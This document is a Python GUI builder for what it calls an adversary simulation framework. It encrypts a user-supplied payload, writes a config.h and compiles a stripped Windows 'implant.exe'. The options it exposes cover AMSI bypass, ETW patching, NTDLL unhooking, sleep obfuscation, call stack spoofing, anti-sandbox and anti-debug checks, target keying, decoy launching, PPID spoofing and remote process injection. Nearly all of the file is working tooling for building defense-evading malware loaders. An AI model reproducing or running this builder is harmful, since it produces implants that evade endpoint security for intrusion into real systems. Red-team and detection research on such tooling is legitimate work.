#!/usr/bin/env python3
"""
Adversary Simulation Framework — GUI Builder
Generates config.h, encrypts payload, compiles implant.
"""

import os
import sys
import subprocess
import threading
import customtkinter as ctk
from tkinter import filedialog, messagebox

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


def get_app_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


def find_gcc():
    app_dir = get_app_dir()
    candidates = [
        os.path.join(app_dir, "gcc", "bin", "gcc.exe"),
        os.path.join(app_dir, "mingw64", "bin", "gcc.exe"),
        r"C:\msys64\ucrt64\bin\gcc.exe",
        r"C:\msys64\mingw64\bin\gcc.exe",
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    try:
        result = subprocess.run(["where", "gcc.exe"], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip().split("\n")[0]
    except:
        pass
    return None


class BuilderApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Adversary Simulation Framework")
        self.geometry("550x750")
        self.resizable(False, False)

        self.base_dir = get_app_dir()
        self.gcc_path = find_gcc()
        self._build_ui()

    def _section(self, parent, title):
        ctk.CTkLabel(parent, text=title, font=ctk.CTkFont(size=13, weight="bold"),
                      text_color="#4A9EFF").pack(anchor="w", padx=10, pady=(12, 4))

    def _build_ui(self):
        ctk.CTkLabel(self, text="ADVERSARY SIMULATION FRAMEWORK",
                      font=ctk.CTkFont(size=16, weight="bold")).pack(pady=(12, 2))

        scroll = ctk.CTkScrollableFrame(self, width=520, height=550)
        scroll.pack(padx=10, pady=5, fill="both", expand=True)

        # Payload
        self._section(scroll, "PAYLOAD")
        f = ctk.CTkFrame(scroll, fg_color="transparent")
        f.pack(fill="x", padx=10, pady=2)
        self.payload_path = ctk.CTkEntry(f, placeholder_text="payload_raw.bin", width=380)
        self.payload_path.pack(side="left", padx=(0, 5))
        ctk.CTkButton(f, text="Browse", width=70,
                       command=lambda: self._browse(self.payload_path)).pack(side="left")

        f2 = ctk.CTkFrame(scroll, fg_color="transparent")
        f2.pack(fill="x", padx=10, pady=2)
        self.enc_var = ctk.StringVar(value="xor")
        ctk.CTkRadioButton(f2, text="XOR", variable=self.enc_var, value="xor").pack(side="left", padx=8)
        ctk.CTkRadioButton(f2, text="RC4", variable=self.enc_var, value="rc4").pack(side="left", padx=8)
        self.entropy_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(f2, text="Entropy Reduction", variable=self.entropy_var).pack(side="left", padx=15)

        # Techniques
        self._section(scroll, "EVASION")
        self.etw_var = ctk.BooleanVar(value=True)
        self.amsi_var = ctk.BooleanVar(value=True)
        self.unhook_var = ctk.BooleanVar(value=True)
        self.sleep_var = ctk.BooleanVar(value=True)
        self.stack_var = ctk.BooleanVar(value=True)
        self.pe_stomp_var = ctk.BooleanVar(value=True)

        ctk.CTkCheckBox(scroll, text="ETW Patching", variable=self.etw_var).pack(anchor="w", padx=20, pady=1)
        ctk.CTkCheckBox(scroll, text="AMSI Bypass", variable=self.amsi_var).pack(anchor="w", padx=20, pady=1)
        ctk.CTkCheckBox(scroll, text="Sleep Obfuscation (Ekko)", variable=self.sleep_var).pack(anchor="w", padx=20, pady=1)
        ctk.CTkCheckBox(scroll, text="Call Stack Spoofing", variable=self.stack_var).pack(anchor="w", padx=20, pady=1)
        ctk.CTkCheckBox(scroll, text="PE Header Stomping", variable=self.pe_stomp_var).pack(anchor="w", padx=20, pady=1)

        f_unhook = ctk.CTkFrame(scroll, fg_color="transparent")
        f_unhook.pack(fill="x", padx=20, pady=1)
        ctk.CTkCheckBox(f_unhook, text="NTDLL Unhook", variable=self.unhook_var).pack(side="left")
        self.unhook_method = ctk.StringVar(value="knowndlls")
        ctk.CTkRadioButton(f_unhook, text="KnownDlls", variable=self.unhook_method, value="knowndlls").pack(side="left", padx=8)
        ctk.CTkRadioButton(f_unhook, text="Disk", variable=self.unhook_method, value="disk").pack(side="left", padx=8)

        self._section(scroll, "PRE-EXECUTION")
        self.env_key_var = ctk.BooleanVar(value=True)
        self.anti_sandbox_var = ctk.BooleanVar(value=True)
        self.anti_debug_var = ctk.BooleanVar(value=True)
        self.delay_var = ctk.BooleanVar(value=False)

        ctk.CTkCheckBox(scroll, text="Environmental Keying", variable=self.env_key_var).pack(anchor="w", padx=20, pady=1)
        ctk.CTkCheckBox(scroll, text="Anti-Sandbox", variable=self.anti_sandbox_var).pack(anchor="w", padx=20, pady=1)
        ctk.CTkCheckBox(scroll, text="Anti-Debug", variable=self.anti_debug_var).pack(anchor="w", padx=20, pady=1)

        f_delay = ctk.CTkFrame(scroll, fg_color="transparent")
        f_delay.pack(fill="x", padx=20, pady=1)
        ctk.CTkCheckBox(f_delay, text="Delay Execution", variable=self.delay_var).pack(side="left")
        self.delay_sec = ctk.CTkEntry(f_delay, placeholder_text="300", width=50)
        self.delay_sec.pack(side="left", padx=5)
        ctk.CTkLabel(f_delay, text="sec").pack(side="left")

        f_target = ctk.CTkFrame(scroll, fg_color="transparent")
        f_target.pack(fill="x", padx=20, pady=2)
        ctk.CTkLabel(f_target, text="Hostname:").pack(side="left")
        self.hostname_entry = ctk.CTkEntry(f_target, placeholder_text="any", width=120)
        self.hostname_entry.pack(side="left", padx=4)
        ctk.CTkLabel(f_target, text="User:").pack(side="left")
        self.username_entry = ctk.CTkEntry(f_target, placeholder_text="any", width=120)
        self.username_entry.pack(side="left", padx=4)

        self._section(scroll, "DECOY")
        f_decoy = ctk.CTkFrame(scroll, fg_color="transparent")
        f_decoy.pack(fill="x", padx=20, pady=1)
        self.decoy_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(f_decoy, text="Open decoy app", variable=self.decoy_var).pack(side="left")
        self.decoy_app = ctk.CTkEntry(f_decoy, placeholder_text="excel.exe", width=180)
        self.decoy_app.pack(side="left", padx=8)
        self.decoy_app.insert(0, "excel.exe")

        self._section(scroll, "INJECTION")
        self.inject_var = ctk.StringVar(value="self")
        ctk.CTkRadioButton(scroll, text="Self-Inject", variable=self.inject_var, value="self").pack(anchor="w", padx=20, pady=1)
        ctk.CTkRadioButton(scroll, text="Module Stomping", variable=self.inject_var, value="stomp").pack(anchor="w", padx=20, pady=1)

        f_remote = ctk.CTkFrame(scroll, fg_color="transparent")
        f_remote.pack(fill="x", padx=20, pady=1)
        ctk.CTkRadioButton(f_remote, text="Remote Process", variable=self.inject_var, value="remote").pack(side="left")
        self.remote_proc = ctk.CTkEntry(f_remote, placeholder_text="explorer.exe", width=130)
        self.remote_proc.pack(side="left", padx=8)

        f_ppid = ctk.CTkFrame(scroll, fg_color="transparent")
        f_ppid.pack(fill="x", padx=20, pady=1)
        self.ppid_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(f_ppid, text="PPID Spoof", variable=self.ppid_var).pack(side="left")
        self.ppid_parent = ctk.CTkEntry(f_ppid, placeholder_text="explorer.exe", width=130)
        self.ppid_parent.pack(side="left", padx=8)

        # Output
        self._section(scroll, "OUTPUT")
        f_out = ctk.CTkFrame(scroll, fg_color="transparent")
        f_out.pack(fill="x", padx=10, pady=2)
        self.output_name = ctk.CTkEntry(f_out, placeholder_text="implant.exe", width=160)
        self.output_name.pack(side="left", padx=(0, 8))
        self.output_name.insert(0, "implant.exe")
        self.sanitize_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(f_out, text="PE Sanitize", variable=self.sanitize_var).pack(side="left")

        # Build
        self.build_btn = ctk.CTkButton(self, text="BUILD", font=ctk.CTkFont(size=15, weight="bold"),
                                        height=40, command=self._start_build)
        self.build_btn.pack(padx=10, pady=(8, 4), fill="x")

        self.progress = ctk.CTkProgressBar(self)
        self.progress.pack(padx=10, pady=2, fill="x")
        self.progress.set(0)

        self.status_label = ctk.CTkLabel(self, text="Ready", font=ctk.CTkFont(size=11))
        self.status_label.pack(pady=(0, 4))

        gcc_text = f"GCC: {self.gcc_path}" if self.gcc_path else "GCC: NOT FOUND"
        ctk.CTkLabel(self, text=gcc_text, font=ctk.CTkFont(size=9), text_color="gray").pack(pady=(0, 4))

    def _browse(self, entry):
        path = filedialog.askopenfilename(filetypes=[("Binary", "*.bin"), ("All", "*.*")])
        if path:
            entry.delete(0, "end")
            entry.insert(0, path)

    def _set_status(self, text, progress=None):
        self.status_label.configure(text=text)
        if progress is not None:
            self.progress.set(progress)
        self.update_idletasks()

    def _generate_config(self):
        delay_s = self.delay_sec.get() or "300"
        inject_self = 1 if self.inject_var.get() == "self" else 0
        inject_remote = 1 if self.inject_var.get() == "remote" else 0
        inject_stomp = 1 if self.inject_var.get() == "stomp" else 0
        remote = self.remote_proc.get() or "explorer.exe"
        ppid = self.ppid_parent.get() or "explorer.exe"

        config = f"""#pragma once
#define ENABLE_ENV_KEYING        {int(self.env_key_var.get())}
#define ENABLE_ANTI_SANDBOX      {int(self.anti_sandbox_var.get())}
#define ENABLE_ANTI_DEBUG        {int(self.anti_debug_var.get())}
#define ENABLE_DELAY_EXEC        {int(self.delay_var.get())}
#define DELAY_SECONDS            {delay_s}
#define ENABLE_ETW_PATCH         {int(self.etw_var.get())}
#define ENABLE_AMSI_PATCH        {int(self.amsi_var.get())}
#define ENABLE_UNHOOK            {int(self.unhook_var.get())}
#define UNHOOK_METHOD_KNOWNDLLS  {1 if self.unhook_method.get() == "knowndlls" else 0}
#define INJECT_SELF              {inject_self}
#define INJECT_REMOTE            {inject_remote}
#define INJECT_MODULE_STOMP      {inject_stomp}
#define REMOTE_PROCESS           "{remote}"
#define ENABLE_PPID_SPOOF        {int(self.ppid_var.get())}
#define PPID_PARENT              "{ppid}"
#define ENABLE_PE_STOMP          {int(self.pe_stomp_var.get())}
#define ENABLE_SLEEP_OBFUSCATION {int(self.sleep_var.get())}
#define ENABLE_STACK_SPOOF       {int(self.stack_var.get())}
#define USE_RC4                  {1 if self.enc_var.get() == "rc4" else 0}
#define TARGET_HOSTNAME          "{self.hostname_entry.get()}"
#define TARGET_USERNAME          "{self.username_entry.get()}"
#define TARGET_DOMAIN            ""
#define ENABLE_DECOY             {int(self.decoy_var.get())}
#define DECOY_APP                "{self.decoy_app.get() or 'excel.exe'}"
"""
        with open(os.path.join(self.base_dir, "src", "config.h"), "w") as f:
            f.write(config)

    def _run_cmd(self, args, desc):
        gcc_dir = os.path.dirname(self.gcc_path)
        env = os.environ.copy()
        env["PATH"] = gcc_dir + ";" + env.get("PATH", "")
        result = subprocess.run(args, capture_output=True, text=True, cwd=self.base_dir, env=env)
        if result.returncode != 0:
            raise RuntimeError(f"{desc} failed:\n{result.stderr or result.stdout}")
        return result.stdout

    def _do_build(self):
        try:
            if not self.gcc_path:
                raise RuntimeError("GCC not found")

            payload = self.payload_path.get()
            if not payload or not os.path.isfile(payload):
                raise RuntimeError("Select a valid payload file")

            output_name = self.output_name.get() or "implant.exe"
            build_dir = os.path.join(self.base_dir, "build")
            os.makedirs(build_dir, exist_ok=True)

            self._set_status("[1/5] Generating config.h...", 0.1)
            self._generate_config()

            self._set_status("[2/5] Building tools...", 0.2)
            bin2header = os.path.join(build_dir, "bin2header.exe")
            pe_sanitize = os.path.join(build_dir, "pe_sanitize.exe")
            if not os.path.isfile(bin2header):
                self._run_cmd([self.gcc_path, "-O2", os.path.join("tools", "bin2header.c"), "-o", bin2header], "bin2header")
            if not os.path.isfile(pe_sanitize):
                self._run_cmd([self.gcc_path, "-O2", os.path.join("tools", "pe_sanitize.c"), "-o", pe_sanitize], "pe_sanitize")

            self._set_status("[3/5] Encrypting payload...", 0.4)
            args = [bin2header, payload]
            if self.enc_var.get() == "rc4":
                args.append("--rc4")
            if not self.entropy_var.get():
                args.append("--no-entropy-reduce")
            self._run_cmd(args, "Payload encryption")

            self._set_status("[4/5] Compiling...", 0.6)
            syscalls_o = os.path.join(build_dir, "syscalls.o")
            if not os.path.isfile(syscalls_o):
                self._run_cmd([self.gcc_path, "-c", os.path.join("asm", "syscalls.x64.s"), "-o", syscalls_o], "Syscall asm")

            output_path = os.path.join(build_dir, output_name)
            sources = [
                "src\\standalone.c", "src\\winapi.c", "src\\hellsgate.c",
                "src\\api_hash.c", "src\\crypto.c", "src\\ntdll_unhook.c",
                "src\\env_keying.c", "src\\telemetry.c", "src\\sleep_obf.c",
                "src\\stackspoof.c", "src\\module_stomp.c",
                "src\\inject_remote.c", "src\\ppid_spoof.c", syscalls_o,
            ]
            self._run_cmd([self.gcc_path, "-O2", "-s", "-w",
                "-fno-ident", "-fno-asynchronous-unwind-tables"] + sources + [
                "-o", output_path, "-lntdll", "-ladvapi32", "-mwindows"], "Compilation")

            self._set_status("[5/5] Sanitizing PE...", 0.85)
            if self.sanitize_var.get():
                self._run_cmd([pe_sanitize, output_path], "PE sanitization")

            size_kb = os.path.getsize(output_path) / 1024
            size_str = f"{size_kb/1024:.1f} MB" if size_kb > 1024 else f"{size_kb:.1f} KB"
            self._set_status(f"BUILD OK — {output_name} ({size_str})", 1.0)
            self.after(0, lambda: messagebox.showinfo("Done", f"build\\{output_name}\n{size_str}"))

        except Exception as e:
            err_msg = str(e)
            self._set_status(f"ERROR: {err_msg}", 0)
            self.after(0, lambda: messagebox.showerror("Build Failed", err_msg))
        finally:
            self.after(0, lambda: self.build_btn.configure(state="normal"))

    def _start_build(self):
        self.build_btn.configure(state="disabled")
        threading.Thread(target=self._do_build, daemon=True).start()


if __name__ == "__main__":
    app = BuilderApp()
    app.mainloop()
